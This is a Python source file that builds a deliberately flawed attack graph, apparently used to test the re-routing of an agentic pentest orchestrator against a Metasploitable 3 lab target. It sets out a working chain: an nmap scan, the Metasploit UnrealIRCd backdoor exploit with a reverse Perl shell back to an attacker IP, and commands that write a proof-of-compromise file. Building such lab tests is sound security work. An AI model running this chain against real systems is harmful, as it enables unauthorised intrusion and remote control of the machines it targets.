"""
Example Attack Graph: DELIBERATELY FLAWED at the RECON-ROUTING stage (Metasploitable 3)

This graph is designed to break at the recon -> gain_access EDGE, not at any
node's execution. Recon itself succeeds (the nmap node runs fine and discovers
the target's real services). The flaw lives in the routing condition:

  THE FLAW: the recon -> gain_access edge is gated on a CLOSED port. The edge
  check uses operator="any_port" with expected={"port": 8484} (Jenkins), which
  is NOT open on this target. So recon produces valid evidence, but the planned
  route's precondition is never satisfied -- the prescribed path is invalid.

  EXPECTED ADAPTATION: because the planned edge to gain_access cannot fire, the
  orchestrator's replanner must notice the dead route and RE-ROUTE -- selecting
  a real, reachable initial-access vector from the discovered services instead
  of the dead Jenkins-on-8484 assumption. The gain_access node still prescribes
  a concrete, working module (UnrealIRCd 3.2.8.1 backdoor on 6667), so once the
  replanner re-routes recon -> gain_access (or routes through an equivalent
  initial-access step), the chain can proceed to the session-gated file_drop.

In short: the NODE plan is fine, the EDGE plan is wrong. This exercises the
replanner's re-routing behavior at the recon stage, distinct from the
direct->subagent fallback exercised by examples/flawed_graph.py (which breaks
on a wrong MODULE rather than a wrong EDGE).

Run with explore=True so the replanner is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flaw_recon_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target and drop a verified "
                  "proof-of-compromise file. (This plan is intentionally flawed "
                  "at the recon-routing stage: the recon -> gain_access edge is "
                  "gated on a CLOSED port (Jenkins 8484), so the planned route is "
                  "invalid and the system must replan / re-route to a real "
                  "initial-access vector.)",
        target_ip=target_ip,
        name=f"flaw_recon_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally-flawed RECON-ROUTING chain to test replanner re-routing.",
        metadata={"scenario": "flaw_recon_routing", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a session on the target",
        objective=f"Gain an initial session on {target_ip} via the UnrealIRCd "
                  f"3.2.8.1 backdoor on port 6667. LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 6667,
        },
        payload="cmd/unix/reverse_perl",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4461,
        },
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session, then read "
                  "it back to verify the write succeeded.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_flaw_recon.txt",
            "marker": "PWNED via UnrealIRCd backdoor (flaw_recon replan test)",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_flaw_recon.txt", "/tmp/pwned_flaw_recon2.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_flaw_recon.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    # THE FLAW: gate recon -> gain_access on a CLOSED port (Jenkins 8484).
    # Recon succeeds, but this precondition never holds, so the planned route is
    # invalid and the replanner must re-route to a real initial-access vector.
    graph.connect(
        "recon", "gain_access",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 8484},
                description="(intentionally wrong) assumes Jenkins on 8484, which is CLOSED on this target",
            ),
        ],
        evidence="(intended-invalid) assumes a Jenkins service that is not present",
        rationale="intentional flaw: planned service not present -> system must replan",
    )

    graph.connect(
        "gain_access", "file_drop",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="session opened",
            ),
        ],
        evidence="Initial session established via UnrealIRCd backdoor",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_flaw_recon_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/flaw_recon_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
